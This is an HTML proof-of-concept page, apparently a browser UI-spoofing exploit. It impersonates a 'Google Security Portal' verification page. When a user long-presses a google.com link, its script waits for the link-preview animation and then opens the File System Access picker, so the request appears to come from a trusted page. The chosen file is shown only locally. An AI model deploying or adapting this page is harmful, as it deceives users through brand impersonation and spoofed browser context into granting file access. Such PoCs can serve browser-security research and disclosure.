<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Security PoC - File Picker & Image Preview</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #fcfcfc;
            color: #202124;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .banner {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 8px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        h1 {
            font-size: 22px;
            color: #1a73e8;
            margin-bottom: 24px;
        }
        a.spoof-link {
            display: inline-block;
            background-color: #1a73e8;
            color: white;
            padding: 16px 32px;
            text-decoration: none;
            font-weight: 600;
            font-size: 16px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(26, 115, 232, 0.3);
            transition: background-color 0.2s;
        }
        a.spoof-link:active {
            background-color: #1557b0;
        }
        .preview-container {
            margin-top: 25px;
            max-width: 300px;
            display: none;
        }
        .preview-container img {
            width: 100%;
            border-radius: 8px;
            border: 1px solid #dadce0;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        .file-info {
            margin-top: 10px;
            font-size: 13px;
            color: #5f6368;
        }
        .footer-note {
            margin-top: 30px;
            font-size: 12px;
            color: #9aa0a6;
        }
    </style>
</head>
<body>

    <div class="banner">Google Security Portal</div>
    <h1>Verifikasi Dokumen Pengguna</h1>

    <!-- Tautan target murni untuk memicu Preview Page -->
    <a href="https://google.com" class="spoof-link" id="targetLink">Long Press -> Preview Page</a>

    <!-- Area Pratinjau Gambar yang Diunggah -->
    <div class="preview-container" id="previewBox">
        <img id="imagePreview" src="" alt="Pratinjau Berkas">
        <div class="file-info" id="fileInfo"></div>
    </div>

    <div class="footer-note">Sistem verifikasi aman berbasis cloud.</div>

    <script>
        let triggered = false;

        // Fungsi eksekusi utama File System Access API
        const executeAttackVector = () => {
            if (triggered) return;
            triggered = true;

            // Timer dioptimalkan agar pas dengan durasi animasi preview page terbuka
            setTimeout(async () => {
                try {
                    // Mengubah tipe penerimaan agar mendukung gambar untuk preview
                    const [fileHandle] = await window.showOpenFilePicker({
                        multiple: false,
                        types: [{
                            description: 'Gambar & Dokumen',
                            accept: { 
                                'image/*': ['.png', '.jpg', '.jpeg', '.webp'],
                                'application/pdf': ['.pdf']
                            }
                        }]
                    });

                    // Mengambil data file yang dipilih pengguna
                    const file = await fileHandle.getFile();
                    
                    // Menampilkan informasi nama file
                    const fileInfo = document.getElementById("fileInfo");
                    fileInfo.innerText = `File terpilih: ${file.name}`;

                    // Jika file berupa gambar, tampilkan pratinjaunya di halaman
                    const previewBox = document.getElementById("previewBox");
                    const imagePreview = document.getElementById("imagePreview");
                    
                    if (file.type.startsWith('image/')) {
                        imagePreview.src = URL.createObjectURL(file);
                        previewBox.style.display = "block";
                    } else {
                        imagePreview.src = "";
                        previewBox.style.display = "block";
                    }

                } catch (err) {
                    console.debug("Aksi file picker dihentikan:", err.message);
                } finally {
                    setTimeout(() => { triggered = false; }, 1000);
                }
            }, 1700); // 1.7 detik waktu tunggu optimal untuk ephemeral tab
        };

        // Event listener untuk menangkap gestur konteks menu (long press)
        const targetElement = document.getElementById("targetLink");

        targetElement.addEventListener("contextmenu", (e) => {
            executeAttackVector();
        });

        targetElement.addEventListener("touchstart", (e) => {
            // Membantu mendeteksi interaksi sentuh awal pada perangkat seluler
        }, { passive: true });
    </script>

</body>
</html>
